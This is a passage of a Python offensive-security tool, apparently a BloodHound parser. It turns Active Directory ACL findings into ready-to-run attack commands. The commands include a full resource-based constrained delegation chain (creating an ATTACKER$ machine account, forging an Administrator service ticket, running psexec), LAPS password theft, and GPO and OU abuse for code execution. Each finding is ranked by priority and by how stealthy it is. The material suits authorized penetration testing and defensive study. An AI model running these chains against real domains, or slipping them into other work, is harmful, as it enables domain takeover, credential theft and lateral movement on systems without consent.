                if right in ['GenericAll', 'GenericWrite', 'WriteProperty', 'WriteOwner', 'WriteDacl']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'RBCD',
                        'description': f'{right} on {comp_name} → Resource-Based Constrained Delegation',
                        'command': f"# Step 1: Create controlled computer\n" +
                                  f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add computer ATTACKER$ 'P@ssw0rd123!'\n\n" +
                                  f"# Step 2: Configure RBCD\n" +
                                  f"bloodyAD add rbcd {self._sq(comp_name)} 'ATTACKER$'\n\n" +
                                  f"# Step 3: Get service ticket as Administrator\n" +
                                  f"impacket-getST -spn cifs/{comp_name} -impersonate Administrator {self.domain}/ATTACKER$:P@ssw0rd123! -dc-ip {self.dc_ip}\n\n" +
                                  f"# Step 4: Use ticket\n" +
                                  f"export KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass {comp_name}",
                        'impact': 'IMPERSONATE ANY USER → LOCAL ADMIN',
                        'prerequisites': f'{right} + MachineAccountQuota > 0',
                        'opsec': 'LOW - stealthy attack'
                    })
                
                # ReadLAPSPassword
                if right in ['ReadLAPSPassword', 'GenericAll', 'AllExtendedRights']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadLAPS',
                        'description': f'Read LAPS password on {comp_name}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object {self._sq(comp_name)} --attr ms-Mcs-AdmPwd",
                        'follow_up': f"psexec.py Administrator:LAPS_PASSWORD@{comp_name}",
                        'impact': 'LOCAL ADMINISTRATOR ACCESS',
                        'prerequisites': 'ReadLAPSPassword',
                        'opsec': 'LOW'
                    })
        
        return commands
    
    def _analyze_ou_attacks(self):
        """Analyze OUs for GPO abuse"""
        commands = []
        
        for ou in self.ous:
            if not isinstance(ou, dict):
                continue
            props = self._props(ou)
            ou_name = props.get('name', '')
            
            if not ou_name:
                continue
            
            for ace in self._aces(ou):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # GenericAll / WriteDacl / WriteProperty
                if right in ['GenericAll', 'WriteDacl', 'WriteProperty']:
                    commands.append({
                        'priority': 'MEDIUM',
                        'type': 'GPOAbuse',
                        'description': f'{right} on OU: {ou_name} → Link malicious GPO',
                        'command': f"# Create malicious GPO, then link it\n" +
                                  f"# Requires creating GPO first (manual in GPMC)",
                        'follow_up': "Computer/users in OU will apply GPO at next refresh",
                        'impact': 'CODE EXECUTION ON OU OBJECTS',
                        'prerequisites': f'{right} on OU',
                        'opsec': 'MEDIUM'
                    })
        
        return commands
    
    def _analyze_gpo_attacks(self):
        """Analyze GPOs for modification"""
        commands = []
        
        for gpo in self.gpos:
            if not isinstance(gpo, dict):
                continue
            props = self._props(gpo)
            gpo_name = props.get('name', '')
            
            if not gpo_name:
                continue
            
            for ace in self._aces(gpo):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # GenericAll / GenericWrite / WriteProperty
                if right in ['GenericAll', 'GenericWrite', 'WriteProperty', 'WriteOwner', 'WriteDacl']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'GPOModification',
                        'description': f'{right} on GPO: {gpo_name} → Modify for code execution',
                        'command': f"# Use SharpGPOAbuse or manual editing\n" +
                                  f"# Add immediate scheduled task or startup script",
                        'follow_up': "Force GPO update: gpupdate /force",
                        'impact': 'CODE EXECUTION ON GPO-LINKED OBJECTS',
                        'prerequisites': f'{right} on GPO',
                        'opsec': 'MEDIUM-HIGH'
                    })
        
        return commands
    
    def output_json(self):
        """Output JSON results"""
        result = {
            'domain': self.domain,
            'username': self.username,
            'dc_ip': self.dc_ip,
            'stats': {
                'users': len(self.users),
                'computers': len(self.computers),
                'groups': len(self.groups),
                'domains': len(self.domains),
                'ous': len(self.ous),
                'gpos': len(self.gpos)
            },
            'exploitation_commands': self.exploitation_commands
        }
        
        print(json.dumps(result, indent=2))

def main():
    if len(sys.argv) < 5:
        print("Usage: bloodhound_parser.py <bh_zip> <domain> <username> <dc_ip>", file=sys.stderr)
        sys.exit(1)
    
    bh_zip = sys.argv[1]
    domain = sys.argv[2]
    username = sys.argv[3]
    dc_ip = sys.argv[4]
    
    if not os.path.exists(bh_zip):
        print(f"[-] Error: BloodHound ZIP not found: {bh_zip}", file=sys.stderr)
        sys.exit(1)
    
    parser = BloodHoundParser(bh_zip, domain, username, dc_ip)
    
    print("[*] Parsing BloodHound data...", file=sys.stderr)
    if not parser.extract_and_parse():
        sys.exit(1)
    
    print(f"[+] Parsed {len(parser.users)} users, {len(parser.computers)} computers, " + 
          f"{len(parser.groups)} groups, {len(parser.domains)} domains", file=sys.stderr)
    
    print("[*] Analyzing ALL abuse primitives...", file=sys.stderr)
    parser.exploitation_commands = parser.generate_bloodyad_commands()
    
    if len(parser.exploitation_commands) == 0:
        print("[-] No direct attack paths found from current user", file=sys.stderr)
        print("[!] Try lateral movement or check BloodHound GUI for complex paths", file=sys.stderr)
    else:
        # Show summary by type
        by_priority = {}
        for cmd in parser.exploitation_commands:
            priority = cmd['priority']
            by_priority[priority] = by_priority.get(priority, 0) + 1
        
        print(f"\n[+] Attack Path Summary:", file=sys.stderr)
        for priority in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if priority in by_priority:
                print(f"    {priority}: {by_priority[priority]}", file=sys.stderr)
    
    # Output JSON for bash
    parser.output_json()

if __name__ == "__main__":
    main()
